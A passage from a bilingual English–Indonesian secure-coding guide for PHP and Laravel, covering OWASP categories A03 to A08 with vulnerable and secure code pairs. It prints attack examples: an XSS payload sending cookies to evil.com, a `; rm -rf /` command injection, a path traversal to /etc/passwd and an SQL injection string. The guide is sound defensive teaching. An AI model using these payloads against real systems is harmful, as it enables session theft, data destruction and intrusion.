{{-- DANGEROUS: Only use {!! !!} with trusted, sanitised content --}}
<div class="comment">{!! $comment !!}</div>
```

If you must render HTML from a trusted source (e.g., a rich-text editor), use an HTML purifier:

```php
use Stevebauman\Purify\Facades\Purify;

$cleanHtml = Purify::clean($richTextInput);
```

</section>

<section lang="id">

## A03: Injeksi

Injeksi terjadi ketika data tidak terpercaya dikirim ke interpreter sebagai bagian dari perintah atau query. SQL injection adalah yang paling umum, tetapi command injection, LDAP injection, dan Cross-Site Scripting (XSS) adalah varian injeksi.

### SQL Injection

**Kode Rentan:**

```php
<?php

// BERBAHAYA: Interpolasi string — input penyerang menjadi bagian dari perintah SQL
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '{$username}' AND password = '{$password}'";
$result = $pdo->query($query);
```

Penyerang memasukkan `' OR '1'='1` sebagai username dan password apa pun. Query yang dihasilkan menjadi:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'
```

Ini mengembalikan setiap pengguna dalam database.

**Kode Aman (PDO Prepared Statements):**

```php
<?php

declare(strict_types=1);

// AMAN: Prepared statements memisahkan struktur SQL dari nilai data
$stmt = $pdo->prepare(
    'SELECT id, username, password_hash FROM users WHERE username = :username'
);
$stmt->execute(['username' => $_POST['username']]);

$user = $stmt->fetch(PDO::FETCH_ASSOC);

if ($user && password_verify($_POST['password'], $user['password_hash'])) {
    // Autentikasi berhasil
} else {
    // Selalu gunakan pesan error yang sama — jangan ungkapkan apakah pengguna ada
    throw new AuthenticationException('Username atau password tidak valid.');
}
```

**Laravel: Perlindungan Eloquent ORM.**

Eloquent ORM Laravel menggunakan parameterised query secara default:

```php
// Aman: pengikatan parameter otomatis
$user = User::where('email', $request->email)->first();

// Juga aman: query mentah dengan binding
$users = DB::select(
    'SELECT * FROM users WHERE email = :email AND status = :status',
    ['email' => $request->email, 'status' => 'active']
);

// BERBAHAYA: DB::raw() dengan input tidak disanitasi — hindari kecuali benar-benar diperlukan
$users = DB::table('users')
    ->whereRaw("email = '{$request->email}'") // SQL injection!
    ->get();
```

### Command Injection

**Kode Rentan:**

```php
<?php

// BERBAHAYA: Input pengguna diteruskan langsung ke shell
$filename = $_GET['filename'];
$output = shell_exec("cat /var/reports/{$filename}");
```

Penyerang mengirim `filename=../../etc/passwd` dan membaca file password sistem. Atau `filename=; rm -rf /` dan menghapus server.

**Kode Aman:**

```php
<?php

declare(strict_types=1);

// AMAN: Validasi whitelist, tidak ada eksekusi shell, gunakan fungsi PHP native sebagai gantinya
private const ALLOWED_FILES = [
    'laporan_q1.pdf',
    'laporan_q2.pdf',
    'template_transkrip.docx',
];

public function readReport(string $filename): string
{
    if (!in_array($filename, self::ALLOWED_FILES, true)) {
        throw new \InvalidArgumentException('Nama file tidak valid.');
    }

    $path = realpath('/var/reports/' . basename($filename));

    if ($path === false || !str_starts_with($path, '/var/reports/')) {
        throw new \RuntimeException('Path traversal terdeteksi.');
    }

    return file_get_contents($path);
}
```

**Aturan untuk mencegah command injection:**
- Jangan pernah meneruskan input pengguna ke `shell_exec()`, `exec()`, `system()`, atau operator backtick
- Jika eksekusi shell tidak dapat dihindari, gunakan `escapeshellarg()` dan `escapeshellcmd()`—tapi validasi dulu
- Lebih suka fungsi PHP native (`file_get_contents()`, `PDO`, `curl`) daripada perintah shell

### Cross-Site Scripting (XSS)

**Kode Rentan:**

```php
<?php

// BERBAHAYA: Input pengguna tidak disanitasi dirender langsung di HTML
echo "<div class='comment'>" . $_POST['comment'] . "</div>";
```

Penyerang memposting `<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>` sebagai komentar. Setiap pengguna yang melihat halaman memiliki cookie sesi mereka dikirim ke server penyerang.

**Kode Aman:**

```php
<?php

declare(strict_types=1);

// AMAN: HTML-encode semua input pengguna sebelum rendering
echo "<div class='comment'>" . htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8') . "</div>";
```

**Laravel: Auto-Escaping Blade.**

Template engine Blade Laravel secara otomatis men-escape output dengan `{{ }}`:

```blade
{{-- Aman: auto-escaped --}}
<div class="comment">{{ $comment }}</div>

{{-- BERBAHAYA: Hanya gunakan {!! !!} dengan konten tepercaya dan disanitasi --}}
<div class="comment">{!! $comment !!}</div>
```

Jika Anda harus merender HTML dari sumber tepercaya (misalnya, rich-text editor), gunakan HTML purifier:

```php
use Stevebauman\Purify\Facades\Purify;

$cleanHtml = Purify::clean($richTextInput);
```

</section>

---

<section lang="en">

## A04: Insecure Design

Insecure Design is distinct from implementation bugs. It represents missing or ineffective security controls that should have been architected into the system from the start.

### Missing Rate Limiting

**Vulnerable Code:**

```php
<?php

// DANGEROUS: No rate limiting — attacker can brute-force passwords at wire speed
public function login(string $email, string $password): array
{
    $user = $this->userRepository->findByEmail($email);

    if (!$user || !password_verify($password, $user->passwordHash)) {
        return ['success' => false, 'message' => 'Invalid credentials.'];
    }

    // Create session, issue JWT, etc.
    return ['success' => true, 'token' => $this->jwtService->issue($user)];
}
```

Without rate limiting, an attacker can attempt thousands of logins per second from a single machine.

**Secure Code (Laravel Rate Limiter):**

```php
<?php

declare(strict_types=1);

use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Cache\RateLimiting\Limit;

// In RouteServiceProvider or a dedicated service provider
RateLimiter::for('login', function (Request $request) {
    $key = 'login:' . $request->ip() . '|' . strtolower($request->input('email'));

    return Limit::perMinute(5)->by($key)->response(function () {
        return response()->json([
            'message' => 'Too many login attempts. Please try again in 1 minute.',
        ], 429);
    });
});

// In the controller
public function login(Request $request): \Illuminate\Http\JsonResponse
{
    $executed = RateLimiter::attempt(
        'login',
        5, // max attempts
        function () use ($request) {
            // Actual login logic here
        },
        60, // decay in seconds
    );

    if (!$executed) {
        return response()->json([
            'message' => 'Too many login attempts. Try again in 60 seconds.',
        ], 429);
    }

    return response()->json(['message' => 'Login successful.']);
}
```

### Trust-By-Default vs Zero-Trust

A trust-by-default design assumes requests are legitimate until proven otherwise. Zero-trust assumes every request is hostile until authenticated and authorised.

| Design Pattern | Trust-By-Default | Zero-Trust |
|---|---|---|
| **New user registration** | Auto-activate account → welcome email | Email verification → admin approval (if applicable) → activate |
| **Password reset** | Send new password in email | Send time-limited, single-use reset link |
| **API endpoint** | Accept any JSON → process | Validate Content-Type, authenticate, authorise per resource, rate limit, validate input, log |
| **File upload** | Accept any file → store in `uploads/` | Validate MIME type, scan for malware, strip EXIF, rename, store outside webroot |

### Lack of Audit Log

Without an audit trail, you cannot detect breaches, prove compliance, or defend against repudiation claims:

```php
<?php

declare(strict_types=1);

class AuditLogger
{
    public function __construct(
        private readonly \PDO $pdo,
    ) {}

    public function log(string $userId, string $action, string $resource, array $context = []): void
    {
        $stmt = $this->pdo->prepare(
            'INSERT INTO audit_log (user_id, action, resource, context, ip_address, created_at)
             VALUES (:user_id, :action, :resource, :context, :ip, NOW())'
        );

        $stmt->execute([
            'user_id'  => $userId,
            'action'   => $action,
            'resource' => $resource,
            'context'  => json_encode($context),
            'ip'       => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        ]);
    }
}

// Usage: log every significant action
$this->auditLogger->log($userId, 'grade.updated', "student_record:{$recordId}", [
    'course_id'    => $courseId,
    'old_grade'    => $oldGrade,
    'new_grade'    => $newGrade,
    'changed_by'   => $lecturerId,
]);
```

### Insecure Deserialisation

```php
<?php

// DANGEROUS: unserialize() on user-controlled data allows object injection
$data = unserialize($_COOKIE['user_data']);

// SECURE: Use JSON for data interchange — never unserialize() untrusted input
$data = json_decode($_COOKIE['user_data'], true, 512, JSON_THROW_ON_ERROR);
```

Deserialisation attacks can instantiate arbitrary PHP objects, triggering magic methods (`__wakeup`, `__destruct`, `__toString`) that lead to remote code execution. **Never call `unserialize()` on user-controlled input.**

</section>

<section lang="id">

## A04: Desain Tidak Aman

Desain Tidak Aman berbeda dari bug implementasi. Ini mewakili kontrol keamanan yang hilang atau tidak efektif yang seharusnya diarsitekturkan ke dalam sistem sejak awal.

### Tidak Ada Rate Limiting

**Kode Rentan:**

```php
<?php

// BERBAHAYA: Tidak ada rate limiting — penyerang dapat brute-force password dengan kecepatan penuh
public function login(string $email, string $password): array
{
    $user = $this->userRepository->findByEmail($email);

    if (!$user || !password_verify($password, $user->passwordHash)) {
        return ['success' => false, 'message' => 'Kredensial tidak valid.'];
    }

    // Buat sesi, terbitkan JWT, dll.
    return ['success' => true, 'token' => $this->jwtService->issue($user)];
}
```

Tanpa rate limiting, penyerang dapat mencoba ribuan login per detik dari satu mesin.

**Kode Aman (Laravel Rate Limiter):**

```php
<?php

declare(strict_types=1);

use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Cache\RateLimiting\Limit;

// Di RouteServiceProvider atau service provider khusus
RateLimiter::for('login', function (Request $request) {
    $key = 'login:' . $request->ip() . '|' . strtolower($request->input('email'));

    return Limit::perMinute(5)->by($key)->response(function () {
        return response()->json([
            'message' => 'Terlalu banyak percobaan login. Silakan coba lagi dalam 1 menit.',
        ], 429);
    });
});

// Di controller
public function login(Request $request): \Illuminate\Http\JsonResponse
{
    $executed = RateLimiter::attempt(
        'login',
        5, // maks percobaan
        function () use ($request) {
            // Logika login aktual di sini
        },
        60, // decay dalam detik
    );

    if (!$executed) {
        return response()->json([
            'message' => 'Terlalu banyak percobaan login. Coba lagi dalam 60 detik.',
        ], 429);
    }

    return response()->json(['message' => 'Login berhasil.']);
}
```

### Trust-By-Default vs Zero-Trust

Desain trust-by-default mengasumsikan permintaan sah sampai terbukti sebaliknya. Zero-trust mengasumsikan setiap permintaan bermusuhan sampai terautentikasi dan terotorisasi.

| Pola Desain | Trust-By-Default | Zero-Trust |
|---|---|---|
| **Registrasi pengguna baru** | Auto-aktifkan akun → email selamat datang | Verifikasi email → persetujuan admin (jika berlaku) → aktifkan |
| **Reset password** | Kirim password baru dalam email | Kirim link reset sekali pakai dengan batas waktu |
| **Endpoint API** | Terima JSON apa pun → proses | Validasi Content-Type, autentikasi, otorisasi per resource, rate limit, validasi input, log |
| **Upload file** | Terima file apa pun → simpan di `uploads/` | Validasi tipe MIME, pindai malware, hapus EXIF, ganti nama, simpan di luar webroot |

### Tidak Ada Log Audit

Tanpa jejak audit, Anda tidak dapat mendeteksi pelanggaran, membuktikan kepatuhan, atau bertahan melawan klaim repudiasi:

```php
<?php

declare(strict_types=1);

class AuditLogger
{
    public function __construct(
        private readonly \PDO $pdo,
    ) {}

    public function log(string $userId, string $action, string $resource, array $context = []): void
    {
        $stmt = $this->pdo->prepare(
            'INSERT INTO audit_log (user_id, action, resource, context, ip_address, created_at)
             VALUES (:user_id, :action, :resource, :context, :ip, NOW())'
        );

        $stmt->execute([
            'user_id'  => $userId,
            'action'   => $action,
            'resource' => $resource,
            'context'  => json_encode($context),
            'ip'       => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        ]);
    }
}

// Penggunaan: catat setiap tindakan signifikan
$this->auditLogger->log($userId, 'grade.updated', "student_record:{$recordId}", [
    'course_id'    => $courseId,
    'old_grade'    => $oldGrade,
    'new_grade'    => $newGrade,
    'changed_by'   => $lecturerId,
]);
```

### Deserialisasi Tidak Aman

```php
<?php

// BERBAHAYA: unserialize() pada data yang dikontrol pengguna memungkinkan object injection
$data = unserialize($_COOKIE['user_data']);

// AMAN: Gunakan JSON untuk pertukaran data — jangan pernah unserialize() input tidak terpercaya
$data = json_decode($_COOKIE['user_data'], true, 512, JSON_THROW_ON_ERROR);
```

Serangan deserialisasi dapat menginstansiasi objek PHP arbitrer, memicu magic method (`__wakeup`, `__destruct`, `__toString`) yang mengarah ke eksekusi kode jarak jauh. **Jangan pernah memanggil `unserialize()` pada input yang dikontrol pengguna.**

</section>

---

<section lang="en">

## A05: Security Misconfiguration

Security misconfiguration is the "death by a thousand paper cuts" of application security. Each individual setting seems harmless, but together they expose the entire application.

### Debug Mode in Production

```php
<?php

// DANGEROUS in production: stack traces reveal paths, queries, and framework versions
ini_set('display_errors', '1');
error_reporting(E_ALL);

// In Laravel: APP_DEBUG=true in .env exposes database credentials in error pages
```

**Correct production configuration:**

```php
// php.ini
display_errors = Off
log_errors = On
error_reporting = E_ALL & ~E_DEPRECATED

// Laravel .env
APP_DEBUG=false
APP_ENV=production
```

### Exposed Environment Files

`.env` files in Laravel contain all secrets. If your web server misconfiguration serves static files from the project root:

```
https://student-portal.example.com/.env
→ Returns APP_KEY, DB_PASSWORD, MAIL_PASSWORD, AWS_SECRET...
```

**Prevention:**
- Configure the web server document root to `public/`, never the project root
- Add `.env` to `.gitignore`
- Use `php artisan config:cache` in production — it creates a cached config that does not read `.env`
- Set restrictive file permissions: `chmod 600 .env`

### Default Credentials

**Never** deploy with default credentials. Laravel's default `UserFactory` and seeder often create `admin@example.com / password`. Remove or change these before deploying.

```php
<?php

// In a production seeder, force password changes on first login
class ProductionUserSeeder extends Seeder
{
    public function run(): void
    {
        User::create([
            'name'              => 'Admin',
            'email'             => 'admin@se.polinema.ac.id',
            'password'          => Hash::make(Str::random(32)),
            'must_change_password' => true,
        ]);
    }
}
```

### Security Headers

Missing security headers leave browsers without protection directives:

```php
// In Laravel middleware or Nginx/Apache config
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');
header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
header('Referrer-Policy: strict-origin-when-cross-origin');
header('Permissions-Policy: camera=(), microphone=(), geolocation=()');
```

Laravel can handle these through middleware. Create `app/Http/Middleware/SecurityHeaders.php`:

```php
<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;

class SecurityHeaders
{
    public function handle(Request $request, Closure $next): mixed
    {
        $response = $next($request);

        $response->headers->set('X-Content-Type-Options', 'nosniff');
        $response->headers->set('X-Frame-Options', 'DENY');
        $response->headers->set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');

        return $response;
    }
}
```

</section>

<section lang="id">

## A05: Miskonfigurasi Keamanan

Miskonfigurasi keamanan adalah "kematian oleh seribu luka kertas" dari keamanan aplikasi. Setiap pengaturan individu tampaknya tidak berbahaya, tetapi bersama-sama mereka mengekspos seluruh aplikasi.

### Mode Debug di Production

```php
<?php

// BERBAHAYA di production: stack trace mengungkapkan path, query, dan versi framework
ini_set('display_errors', '1');
error_reporting(E_ALL);

// Di Laravel: APP_DEBUG=true di .env mengekspos kredensial database di halaman error
```

**Konfigurasi production yang benar:**

```php
// php.ini
display_errors = Off
log_errors = On
error_reporting = E_ALL & ~E_DEPRECATED

// Laravel .env
APP_DEBUG=false
APP_ENV=production
```

### File Environment Terekspos

File `.env` di Laravel berisi semua secrets. Jika miskonfigurasi server web Anda menyajikan file statis dari root proyek:

```
https://student-portal.example.com/.env
→ Mengembalikan APP_KEY, DB_PASSWORD, MAIL_PASSWORD, AWS_SECRET...
```

**Pencegahan:**
- Konfigurasikan document root server web ke `public/`, jangan pernah root proyek
- Tambahkan `.env` ke `.gitignore`
- Gunakan `php artisan config:cache` di production — ini membuat config yang di-cache yang tidak membaca `.env`
- Atur izin file restriktif: `chmod 600 .env`

### Kredensial Default

**Jangan pernah** deploy dengan kredensial default. `UserFactory` dan seeder default Laravel sering membuat `admin@example.com / password`. Hapus atau ubah ini sebelum mendeploy.

```php
<?php

// Dalam seeder production, paksa perubahan password pada login pertama
class ProductionUserSeeder extends Seeder
{
    public function run(): void
    {
        User::create([
            'name'                => 'Admin',
            'email'               => 'admin@se.polinema.ac.id',
            'password'            => Hash::make(Str::random(32)),
            'must_change_password' => true,
        ]);
    }
}
```

### Header Keamanan

Header keamanan yang hilang membuat browser tanpa arahan perlindungan:

```php
// Di middleware Laravel atau konfigurasi Nginx/Apache
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');
header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
header('Referrer-Policy: strict-origin-when-cross-origin');
header('Permissions-Policy: camera=(), microphone=(), geolocation=()');
```

Laravel dapat menangani ini melalui middleware. Buat `app/Http/Middleware/SecurityHeaders.php`:

```php
<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;

class SecurityHeaders
{
    public function handle(Request $request, Closure $next): mixed
    {
        $response = $next($request);

        $response->headers->set('X-Content-Type-Options', 'nosniff');
        $response->headers->set('X-Frame-Options', 'DENY');
        $response->headers->set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');

        return $response;
    }
}
```

</section>

---

<section lang="en">

## A06: Vulnerable and Outdated Components

Using components with known vulnerabilities is the fastest path to compromise. The Equifax breach (2017)—exposing 147 million records—was caused by an unpatched Apache Struts vulnerability with a fix available for months.

### PHP Version Management

Running an end-of-life PHP version means no security patches:

```bash
# Check your PHP version
$ php --version

# PHP 8.1 active support ended Nov 2024, security support ends Nov 2025
# PHP 8.2 active support until Dec 2025, security support until Dec 2026
# PHP 8.3 active support until Dec 2026
# PHP 7.4 — end of life since Nov 2022. Do not use.
```

**Recommendation:** Use PHP 8.3 or newer as of 2026. Stay on a supported release line.

### Composer Dependency Auditing

```bash
# Check for known vulnerabilities in your dependencies
$ composer audit

# Example output:
# Found 2 vulnerabilities:
# * guzzlehttp/guzzle (CVE-2024-...) - HTTP/2 header injection
# * symfony/http-foundation (CVE-2025-...) - Session fixation

# Update to patch versions
$ composer update guzzlehttp/guzzle symfony/http-foundation

# Check outdated packages
$ composer outdated --direct

# In CI/CD, run as part of pipeline
$ composer audit --no-dev  # Fail the build if vulnerabilities exist
```

### Automated Dependency Monitoring

Integrate these tools into your workflow:

| Tool | Purpose | GitHub Integration |
|---|---|---|
| **Dependabot** | Auto-PRs for vulnerable dependencies | Native GitHub feature (`.github/dependabot.yml`) |
| **Snyk** | Vulnerability database + fix PRs | Snyk GitHub App |
| **composer audit** | Checks `composer.lock` against advisory DB | Run in CI/CD pipeline |

**Example Dependabot configuration** (`.github/dependabot.yml`):

```yaml
version: 2
updates:
  - package-ecosystem: "composer"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    labels:
      - "dependencies"
      - "security"
```

### Laravel Version

Always run the latest minor/patch of your Laravel major version. Laravel releases security patches regularly.

```bash
# Check current version
$ php artisan --version

# Update to latest patch
$ composer update laravel/framework
```

Review [Laravel's release notes](https://laravel.com/docs/releases) for security fixes. Subscribe to [Laravel security advisories](https://github.com/laravel/laravel/security/advisories).

</section>

<section lang="id">

## A06: Komponen Rentan dan Usang

Menggunakan komponen dengan kerentanan yang diketahui adalah jalur tercepat menuju kompromi. Pelanggaran Equifax (2017)—mengekspos 147 juta catatan—disebabkan oleh kerentanan Apache Struts yang tidak dipatch dengan perbaikan tersedia selama berbulan-bulan.

### Manajemen Versi PHP

Menjalankan versi PHP end-of-life berarti tidak ada patch keamanan:

```bash
# Periksa versi PHP Anda
$ php --version

# PHP 8.1 dukungan aktif berakhir Nov 2024, dukungan keamanan berakhir Nov 2025
# PHP 8.2 dukungan aktif hingga Des 2025, dukungan keamanan hingga Des 2026
# PHP 8.3 dukungan aktif hingga Des 2026
# PHP 7.4 — end of life sejak Nov 2022. Jangan gunakan.
```

**Rekomendasi:** Gunakan PHP 8.3 atau lebih baru per 2026. Tetap di jalur rilis yang didukung.

### Audit Dependensi Composer

```bash
# Periksa kerentanan yang diketahui di dependensi Anda
$ composer audit

# Contoh output:
# Ditemukan 2 kerentanan:
# * guzzlehttp/guzzle (CVE-2024-...) - HTTP/2 header injection
# * symfony/http-foundation (CVE-2025-...) - Session fixation

# Perbarui ke versi patch
$ composer update guzzlehttp/guzzle symfony/http-foundation

# Periksa paket usang
$ composer outdated --direct

# Di CI/CD, jalankan sebagai bagian dari pipeline
$ composer audit --no-dev  # Gagalkan build jika ada kerentanan
```

### Pemantauan Dependensi Otomatis

Integrasikan alat-alat ini ke dalam alur kerja Anda:

| Alat | Tujuan | Integrasi GitHub |
|---|---|---|
| **Dependabot** | Auto-PR untuk dependensi rentan | Fitur native GitHub (`.github/dependabot.yml`) |
| **Snyk** | Database kerentanan + PR perbaikan | Snyk GitHub App |
| **composer audit** | Memeriksa `composer.lock` terhadap advisory DB | Jalankan di pipeline CI/CD |

**Contoh konfigurasi Dependabot** (`.github/dependabot.yml`):

```yaml
version: 2
updates:
  - package-ecosystem: "composer"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    labels:
      - "dependencies"
      - "security"
```

### Versi Laravel

Selalu jalankan minor/patch terbaru dari versi mayor Laravel Anda. Laravel merilis patch keamanan secara teratur.

```bash
# Periksa versi saat ini
$ php artisan --version

# Perbarui ke patch terbaru
$ composer update laravel/framework
```

Tinjau [catatan rilis Laravel](https://laravel.com/docs/releases) untuk perbaikan keamanan. Berlangganan [advisory keamanan Laravel](https://github.com/laravel/laravel/security/advisories).

</section>

---

<section lang="en">

## A07: Identification and Authentication Failures

Authentication failures allow attackers to impersonate legitimate users. This category includes weak passwords, missing MFA, session management flaws, and credential stuffing vulnerabilities.

### Weak Password Policies

**Vulnerable Code:**

```php
<?php

// DANGEROUS: No password strength requirements
public function register(string $email, string $password): User
{
    // No length check, no complexity check, no breach check
    $hash = password_hash($password, PASSWORD_BCRYPT);

    return $this->createUser($email, $hash);
}
```

**Secure Code:**

```php
<?php

declare(strict_types=1);

class PasswordValidator
{
    private const MIN_LENGTH = 12;

    public function validate(string $password): array
    {
        $errors = [];

        if (strlen($password) < self::MIN_LENGTH) {
            $errors[] = sprintf('Password must be at least %d characters.', self::MIN_LENGTH);
        }

        if (!preg_match('/[A-Z]/', $password)) {
            $errors[] = 'Password must contain at least one uppercase letter.';
        }

        if (!preg_match('/[a-z]/', $password)) {
            $errors[] = 'Password must contain at least one lowercase letter.';
        }

        if (!preg_match('/[0-9]/', $password)) {
            $errors[] = 'Password must contain at least one digit.';
        }

        if (!preg_match('/[^a-zA-Z0-9]/', $password)) {
            $errors[] = 'Password must contain at least one special character.';
        }

        // Check against breached password databases
        if ($this->isPwned($password)) {
            $errors[] = 'This password has appeared in known data breaches. Please choose a different one.';
        }

        return $errors;
    }

    private function isPwned(string $password): bool
    {
        $hash = strtoupper(sha1($password));
        $prefix = substr($hash, 0, 5);
        $suffix = substr($hash, 5);

        $response = file_get_contents(
            "https://api.pwnedpasswords.com/range/{$prefix}",
        );

        return str_contains($response, $suffix);
    }
}
```

The k-anonymity model: only the first 5 characters of the SHA-1 hash are sent over the network. The full password never leaves your server.

### Session Management

**Vulnerable Patterns:**

```php
<?php

// DANGEROUS: Session ID unchanged after login — session fixation attack
session_start();
$_SESSION['user_id'] = $user->id;

// DANGEROUS: No session timeout
$_SESSION['last_activity'] = time();
```

**Secure Session Management (Laravel):**

In `config/session.php`:

```php
return [
    'driver'          => env('SESSION_DRIVER', 'database'), // Store sessions in DB, not files
    'lifetime'        => 120,    // 2-hour idle timeout
    'expire_on_close' => true,   // Expire when browser closes
    'encrypt'         => true,   // Encrypt session data
    'secure'          => env('SESSION_SECURE_COOKIE', true), // HTTPS only
    'http_only'       => true,   // Not accessible via JavaScript
    'same_site'       => 'lax',  // CSRF protection
    'domain'          => env('SESSION_DOMAIN'), // Restrict to your domain
];
```

Always regenerate the session ID after login:

```php
<?php

// In AuthController
public function login(Request $request)
{
    if (Auth::attempt($request->only('email', 'password'))) {
        $request->session()->regenerate(); // Prevents session fixation

        return redirect()->intended('/dashboard');
    }

    return back()->withErrors(['email' => 'Invalid credentials.']);
}
```

### Laravel Authentication Guards

Laravel's built-in authentication system provides:

- `auth` middleware for protecting routes
- `guest` middleware for login/register routes
- CSRF protection on all `POST`, `PUT`, `PATCH`, `DELETE` routes
- Remember-me tokens with secure, rotating hashes
- Password reset with hashed, time-limited tokens

```php
// routes/web.php
Route::middleware('auth')->group(function () {
    Route::get('/dashboard', [DashboardController::class, 'index']);
    Route::get('/profile', [ProfileController::class, 'edit']);
});

Route::middleware('guest')->group(function () {
    Route::get('/login', [AuthController::class, 'showLogin']);
    Route::post('/login', [AuthController::class, 'login']);
});
```

</section>

<section lang="id">

## A07: Kegagalan Identifikasi dan Autentikasi

Kegagalan autentikasi memungkinkan penyerang menyamar sebagai pengguna yang sah. Kategori ini mencakup password lemah, tidak ada MFA, kelemahan manajemen sesi, dan kerentanan credential stuffing.

### Kebijakan Password Lemah

**Kode Rentan:**

```php
<?php

// BERBAHAYA: Tidak ada persyaratan kekuatan password
public function register(string $email, string $password): User
{
    // Tidak ada pemeriksaan panjang, pemeriksaan kompleksitas, pemeriksaan pelanggaran
    $hash = password_hash($password, PASSWORD_BCRYPT);

    return $this->createUser($email, $hash);
}
```

**Kode Aman:**

```php
<?php

declare(strict_types=1);

class PasswordValidator
{
    private const MIN_LENGTH = 12;

    public function validate(string $password): array
    {
        $errors = [];

        if (strlen($password) < self::MIN_LENGTH) {
            $errors[] = sprintf('Password harus minimal %d karakter.', self::MIN_LENGTH);
        }

        if (!preg_match('/[A-Z]/', $password)) {
            $errors[] = 'Password harus mengandung setidaknya satu huruf besar.';
        }

        if (!preg_match('/[a-z]/', $password)) {
            $errors[] = 'Password harus mengandung setidaknya satu huruf kecil.';
        }

        if (!preg_match('/[0-9]/', $password)) {
            $errors[] = 'Password harus mengandung setidaknya satu digit.';
        }

        if (!preg_match('/[^a-zA-Z0-9]/', $password)) {
            $errors[] = 'Password harus mengandung setidaknya satu karakter khusus.';
        }

        // Periksa terhadap database password yang dibobol
        if ($this->isPwned($password)) {
            $errors[] = 'Password ini telah muncul dalam pelanggaran data yang diketahui. Silakan pilih yang berbeda.';
        }

        return $errors;
    }

    private function isPwned(string $password): bool
    {
        $hash = strtoupper(sha1($password));
        $prefix = substr($hash, 0, 5);
        $suffix = substr($hash, 5);

        $response = file_get_contents(
            "https://api.pwnedpasswords.com/range/{$prefix}",
        );

        return str_contains($response, $suffix);
    }
}
```

Model k-anonymity: hanya 5 karakter pertama dari hash SHA-1 dikirim melalui jaringan. Password lengkap tidak pernah meninggalkan server Anda.

### Manajemen Sesi

**Pola Rentan:**

```php
<?php

// BERBAHAYA: ID sesi tidak berubah setelah login — serangan session fixation
session_start();
$_SESSION['user_id'] = $user->id;

// BERBAHAYA: Tidak ada timeout sesi
$_SESSION['last_activity'] = time();
```

**Manajemen Sesi Aman (Laravel):**

Di `config/session.php`:

```php
return [
    'driver'          => env('SESSION_DRIVER', 'database'), // Simpan sesi di DB, bukan file
    'lifetime'        => 120,    // Timeout idle 2 jam
    'expire_on_close' => true,   // Kedaluwarsa saat browser ditutup
    'encrypt'         => true,   // Enkripsi data sesi
    'secure'          => env('SESSION_SECURE_COOKIE', true), // Hanya HTTPS
    'http_only'       => true,   // Tidak dapat diakses melalui JavaScript
    'same_site'       => 'lax',  // Perlindungan CSRF
    'domain'          => env('SESSION_DOMAIN'), // Batasi ke domain Anda
];
```

Selalu regenerasi ID sesi setelah login:

```php
<?php

// Di AuthController
public function login(Request $request)
{
    if (Auth::attempt($request->only('email', 'password'))) {
        $request->session()->regenerate(); // Mencegah session fixation

        return redirect()->intended('/dashboard');
    }

    return back()->withErrors(['email' => 'Kredensial tidak valid.']);
}
```

### Guard Autentikasi Laravel

Sistem autentikasi bawaan Laravel menyediakan:

- Middleware `auth` untuk melindungi rute
- Middleware `guest` untuk rute login/register
- Perlindungan CSRF pada semua rute `POST`, `PUT`, `PATCH`, `DELETE`
- Token remember-me dengan hash aman yang berputar
- Reset password dengan token hash berbatas waktu

```php
// routes/web.php
Route::middleware('auth')->group(function () {
    Route::get('/dashboard', [DashboardController::class, 'index']);
    Route::get('/profile', [ProfileController::class, 'edit']);
});

Route::middleware('guest')->group(function () {
    Route::get('/login', [AuthController::class, 'showLogin']);
    Route::post('/login', [AuthController::class, 'login']);
});
```

</section>

---

<section lang="en">

## A08: Software and Data Integrity Failures

This risk covers failures to verify the integrity of software updates, critical data, and CI/CD pipelines. In the PHP ecosystem, the primary concern is **dependency confusion** and **untrusted deserialisation** (covered in A04).

### Composer Dependency Confusion

Dependency confusion occurs when an attacker publishes a package with the same name as your internal package to Packagist. If your `composer.json` references a private package without explicitly configuring the private repository, Composer might pull the public (malicious) package instead.

**Prevention:**

```json
{
    "repositories": [
        {
            "type": "composer",
            "url": "https://composer.se.polinema.ac.id"
        }
    ],
    "config": {
        "secure-http": true,
        "github-protocols": ["https"],
        "allow-plugins": {
            "php-http/discovery": false
        }
    }
}
```

- Always use `https` for Composer repositories
- Set `secure-http: true` to block unencrypted downloads
- Explicitly list allowed plugins — deny everything else
- Using a private Packagist (e.g., Private Packagist, Satis) for internal packages prevents name collisions with public packages

### Composer Lock File Integrity

The `composer.lock` file records exact versions and content hashes of every installed package:

```bash
# Never delete composer.lock — it's your integrity record
# Always commit it to version control

$ composer install --no-dev --optimize-autoloader
# On production: use composer install (not update) to respect the lock file
```

If an attacker modifies a package between your last `composer update` and deployment, `composer install` will detect the hash mismatch and fail. This is your integrity guard.

### CI/CD Pipeline Security

CI/CD pipelines have access to secrets (deploy keys, API tokens). A compromised pipeline can inject backdoors into every build.

| Risk | Mitigation |
|---|---|
| **Unreviewed PRs trigger deploys** | Require approval for workflows triggered by `pull_request_target` |
| **Secrets in build logs** | Never `echo` secrets; use masked environment variables |
| **Third-party GitHub Actions** | Pin actions to a full commit SHA, not a tag or branch |
| **Script injection via PR title/body** | Sanitise any user-controlled input used in shell commands in workflows |

Example of secure action pinning:

```yaml
# SAFE: Pinned to exact commit SHA — immutable
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

# DANGEROUS: Branch reference can be changed by repo owner, injecting malicious code
- uses: actions/checkout@main
```

### Artifact Signing

For internal tool distribution (research tools, SE Lab frameworks), sign your packages:

```bash
# Sign a Phar archive
